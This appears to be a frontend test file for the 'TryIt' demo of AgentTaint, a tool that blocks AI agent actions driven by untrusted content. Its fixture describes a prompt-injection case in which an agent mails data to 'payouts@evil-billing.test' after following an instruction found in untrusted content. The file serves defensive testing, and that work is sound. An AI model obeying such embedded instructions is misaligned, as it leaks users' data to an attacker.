import { cleanup, fireEvent, render, screen, waitFor } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";
import { TryIt } from "./TryIt";

afterEach(() => {
  cleanup();
  vi.unstubAllGlobals();
});

const RESULT = {
  scenario: {
    scenario_id: "custom",
    kind: "custom",
    family: "free_text",
    split: "visitor",
    description: "",
    difficulty: "custom",
  },
  trace_id: "custom#run1",
  call_ids: [],
  span_ids: [],
  agent_call: {
    tool: "email.send",
    arguments: { to: "payouts@evil-billing.test", subject: "Re", body: "Summary" },
  },
  agent_reason: "followed an instruction found in the untrusted content",
  graph: { nodes: [], edges: [], decisions: [] },
  without_agenttaint: { decision: "ALLOW", attack_success: true },
  with_agenttaint: {
    decision: "BLOCK",
    policy_id: "block-untrusted-influence",
    evidence_statuses: ["INFERRED"],
    latency_ms: 3.1,
    explanation: "The recipient was taken from untrusted content.",
  },
};

describe("TryIt", () => {
  it("posts the visitor text and shows verdict, reason and both sides", async () => {
    const fetchMock = vi
      .fn()
      .mockResolvedValue(new Response(JSON.stringify(RESULT), { status: 200 }));
    vi.stubGlobal("fetch", fetchMock);
    render(<TryIt />);
    fireEvent.click(screen.getByRole("button", { name: "Run" }));
    await waitFor(() => expect(screen.getByText("Blocked")).toBeInTheDocument());
    const [url, init] = fetchMock.mock.calls[0];
    expect(url).toBe("/api/v1/demo/custom");
    expect(JSON.parse(init.body).content).toContain("payouts@evil-billing.test");
    expect(screen.getByText(/taken from untrusted content/)).toBeInTheDocument();
    expect(screen.getByText("Without AgentTaint")).toBeInTheDocument();
    expect(screen.getByText(/Your data goes to an address you never chose/)).toBeInTheDocument();
  });

  it("explains rate limits in plain words", async () => {
    vi.stubGlobal("fetch", vi.fn().mockResolvedValue(new Response("slow down", { status: 429 })));
    render(<TryIt />);
    fireEvent.click(screen.getByRole("button", { name: "Run" }));
    await waitFor(() => expect(screen.getByRole("alert")).toHaveTextContent(/Wait a minute/));
  });
});
